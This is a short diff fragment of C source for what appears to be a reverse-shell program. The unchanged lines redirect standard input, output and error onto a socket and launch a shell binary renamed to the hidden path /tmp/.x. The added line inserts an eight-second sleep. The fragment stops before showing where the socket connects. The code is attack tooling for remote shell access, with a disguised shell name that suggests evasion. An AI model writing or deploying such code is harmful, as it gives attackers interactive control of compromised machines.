@@ -18,6 +18,7 @@ int main() {
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
+    sleep(8);
 
     // renamed shell binary (you must create this manually)
     char *args[] = {"/tmp/.x", NULL};
